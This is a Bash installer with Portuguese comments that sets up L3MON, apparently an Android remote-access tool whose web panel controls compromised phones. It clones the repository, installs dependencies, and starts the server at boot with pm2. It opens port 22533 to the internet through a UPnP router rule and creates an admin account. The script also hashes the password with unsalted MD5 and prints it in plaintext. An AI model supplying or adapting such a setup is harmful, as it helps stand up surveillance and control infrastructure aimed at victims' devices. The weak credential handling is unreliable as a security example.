#!/bin/bash

# Função para obter o IP público utilizando o serviço "ipinfo.io"
get_public_ip() {
    ipinfo_response=$(curl -sS "https://ipinfo.io")
    ip_publico=$(echo "$ipinfo_response" | grep -o '"ip": "[^"]*' | cut -d'"' -f4)
    echo "$ip_publico"
}

# Função para configurar o redirecionamento de portas utilizando o IP público obtido
configure_port_forwarding() {
    local ip_publico="$1"
    # Verifica se o usuário é root (ou seja, se está sendo executado com privilégios de administrador).
    if [ "$(id -u)" -eq 0 ]; then
        # Define a porta interna em que o aplicativo L3MON está sendo executado.
        local porta_interna=22533

        # Inicia o cliente UPnP e tenta configurar o redirecionamento de portas.
        upnpc -a "$ip_publico" "$porta_interna" "$porta_interna" TCP
    else
        echo "Este script precisa ser executado com privilégios de administrador (root)."
    fi
}

# Verifica se o usuário é root ou não (ou seja, se está sendo executado com privilégios de administrador).
if [ "$(id -u)" -eq 0 ]; then
    # O usuário é root, definimos algumas variáveis para os comandos
    INSTALL_CMD="apt install"
    NODE_CMD="npm"
    PM2_CMD="pm2"
else
    # O usuário não é root, definimos algumas variáveis para os comandos
    INSTALL_CMD="sudo apt install"
    NODE_CMD="sudo npm"
    PM2_CMD="sudo pm2"
fi

# Verifica se o diretório do repositório já existe; se não, clona o repositório
if [ ! -d "L3MON" ]; then
    git clone https://github.com/efxtv/L3MON.git
fi

# Move o script para dentro do diretório do repositório L3MON (exceto o próprio diretório do script)
script_dir=$(dirname "$(readlink -f "$0")")
l3mon_dir="L3MON/$(basename "$script_dir")"
if [ "$script_dir" != "$l3mon_dir" ]; then
    mv "$script_dir" "$l3mon_dir"
fi

# Acessa o diretório do repositório clonado
cd "L3MON"

# Instala as dependências
$INSTALL_CMD wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre

# Instala dependências adicionais e inicia o aplicativo
$NODE_CMD install
$NODE_CMD audit fix
$NODE_CMD audit
$NODE_CMD install
$PM2_CMD start index.js
$PM2_CMD startup

# Obtém o IP público do roteador utilizando o serviço "ipinfo.io"
ip_publico=$(get_public_ip)

# Verifica se o IP público foi obtido com sucesso antes de prosseguir
if [ -n "$ip_publico" ]; then
    echo "IP Público: $ip_publico"
    configure_port_forwarding "$ip_publico"
else
    echo "Não foi possível obter o IP público. Verifique sua conexão com a Internet."
fi

# Obtém o nome de usuário do usuário
read -p "Digite o nome de usuário (username): " username

# Obtém a senha do usuário para gerar a hash MD5
read -s -p "Digite a senha: " senha
md5hash=$(echo -n "$senha" | openssl md5 | awk '{print $2}')

# Cria o arquivo maindb.json
cat > maindb.json <<EOF
{
  "admin": {
    "username": "$username",
    "password": "$md5hash",
    "loginToken": "",
    "logs": [],
    "ipLog": []
  },
  "clients": []
}
EOF

# Obtém o IP do sistema
ip=$(hostname -I | awk '{print $1}')

# Gera o link
link="http://$ip:22533"

echo "Link gerado: $link"
echo "Credenciais: User:$username Pass:$senha"
